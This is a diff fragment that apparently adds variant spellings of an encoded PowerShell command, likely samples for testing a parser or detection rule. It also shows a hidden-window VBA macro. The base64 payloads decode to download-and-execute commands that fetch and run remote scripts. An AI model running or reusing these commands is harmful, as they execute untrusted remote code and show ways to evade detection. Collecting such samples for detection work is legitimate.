@@ -8,3 +8,11 @@ Start-Process powershell -Verb runAs -ArgumentList "-e LQB3ACAAaAAgAC0AbgBvAHAAI
 Sub A()
     Shell "powershell.exe -ExecutionPolicy Bypass -e aQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdoAHQAdABwAHMAOgAvAC8AMwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwBBAHAALgBwAHMxACcAKQA=", vbHide
 End Sub
+
+pOwERsHeLl -e SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp
+powershell -e: SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp
+powershell -e=SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp
+powershell -e, SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp
+powershell SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp -e
+powershell -NoProfile -e SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp
+powershell -e SQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdodHRwczovL3QubHkvWVB3bXQnKQAp -NoLogo
